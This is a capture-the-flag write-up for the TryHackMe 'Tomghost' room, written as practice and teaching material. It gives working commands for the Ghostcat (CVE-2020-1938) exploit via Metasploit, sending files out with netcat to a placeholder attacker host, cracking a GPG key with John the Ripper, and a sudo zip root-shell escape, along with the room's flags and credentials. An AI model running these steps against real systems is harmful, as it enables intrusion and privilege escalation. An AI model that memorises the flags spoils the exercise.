# Tomghost — TryHackMe Write-Up

## Overview

- **Room name**: [Tomghost](https://tryhackme.com/room/tomghost)
- **Difficulty**: Easy / Medium
- **Main themes**:
    - Service enumeration
    - Apache Tomcat AJP (Ghostcat – CVE-2020-1938)
    - Credential harvesting
    - GPG cracking
    - Sudo privilege escalation (GTFOBins)



## Enumeration

### Nmap Scan

We begin with a full TCP scan to identify open ports and running services:

```bash
nmap -sS -sV -A -p- <TARGET_IP>

```

### Results

The scan reveals the following open ports:

| Port | Service | Description |
| --- | --- | --- |
| 22 | SSH | OpenSSH |
| 53 | DNS | Domain Name System |
| 8009 | AJP | Apache JServ Protocol |
| 8080 | HTTP | Apache Tomcat |

The presence of **Apache Tomcat** on port `8080` and **AJP** on port `8009` is immediately interesting, as it is often associated with known vulnerabilities.



## Web Enumeration (Tomcat)

Port `8080` hosts an Apache Tomcat service.

AJP (`8009`) is particularly notable because of **Ghostcat (CVE-2020-1938)**, a well-known vulnerability allowing **arbitrary file read** via the AJP protocol.

Instead of manually exploiting it, we leverage Metasploit for reliability and speed.



## Exploitation — Ghostcat (CVE-2020-1938)

### Metasploit Setup

```bash
msfconsole

```

Search for Tomcat modules:

```bash
search apache tomcat

```

We find the following module:

```
auxiliary/admin/http/tomcat_ghostcat

```

This module exploits the Ghostcat vulnerability to read sensitive files from the Tomcat server.



### Module Configuration

```bash
use auxiliary/admin/http/tomcat_ghostcat
set RHOST <TARGET_IP>
set RPORT 8009
set LHOST <ATTACKER_IP>
run

```



### Output

The module successfully retrieves `web.xml`, which contains sensitive information:

```xml
<description>
   Welcome to GhostCat
   skyfuck:8730281lkjlkjdqlksalks
</description>

```

### Credentials Found

```
Username: skyfuck
Password: 8730281lkjlkjdqlksalks

```



## Initial Access — User `skyfuck`

Using the obtained credentials, we gain access as user **skyfuck**.

```bash
ssh skyfuck@<TARGET_IP>

```



### Local Enumeration

```bash
ls

```

Files found:

```
credential.pgp
tryhackme.asc

```

Searching for user flag:

```bash
locate user.txt
cat /home/merlin/user.txt

```

### User Flag

```
THM{GhostCat_1s_so_cr4sy}

```

**User flag obtained**



## 🔼 Privilege Escalation — Stage 1 (Credential Harvesting)

The two files found appear to be **GPG encrypted**, suggesting we need to crack or decrypt them.

### File Transfer with Netcat

### On attacker machine:

```bash
nc -lvnp 4444 > weird.pgp

```

### On target machine:

```bash
nc <ATTACKER_IP> 4444 < credential.pgp

```

Repeat the process for `tryhackme.asc`.



## GPG Cracking

### Extract Hash from GPG File

```bash
gpg2john tryhackme.asc > hashes.txt

```

### Crack with John the Ripper

```bash
john --wordlist=rockyou.txt hashes.txt

```

### Password Found

```
alexandru

```



## Decrypting the GPG File

### Import the key:

```bash
gpg --import weird.gpg

```

### Decrypt using the passphrase:

```bash
gpg --decrypt weird.gpg

```

### Decrypted Credentials

```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

```



## Shell as `merlin`

```bash
ssh merlin@<TARGET_IP>

```

We now have access as **merlin**, but we still cannot read `root.txt`.



## 🔼 Privilege Escalation — Stage 2 (Sudo Abuse)

### Check sudo permissions

```bash
sudo -l

```

Output shows:

```
(ALL : ALL) /bin/zip

```

This means **merlin can run `/bin/zip` as root**.



## Exploitation via GTFOBins

We check **GTFOBins** for `zip` and find a known privilege escalation technique.

### Exploit Command

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'

```

This spawns a root shell.



### Verification

```bash
whoami

```

Output:

```
root

```



## Root Flag

```bash
cat /root/root.txt

```

```
THM{Z1P_1S_FAKE}

```

**Root flag obtained**



## 🧠 Conclusion & Key Takeaways

- Ghostcat (CVE-2020-1938) remains a **critical misconfiguration vulnerability**
- AJP should **never be exposed** without strict controls
- GPG files often hide credentials in CTFs
- `sudo -l` is one of the **most powerful enumeration commands**
- GTFOBins is essential, but understanding *why* it works matters more than copy-pasting



## Attack Chain Summary

1. Nmap enumeration
2. Identify Tomcat + AJP
3. Exploit Ghostcat
4. Gain user `skyfuck`
5. Crack GPG credentials
6. SSH as `merlin`
7. Abuse `sudo zip`
8. Root compromise
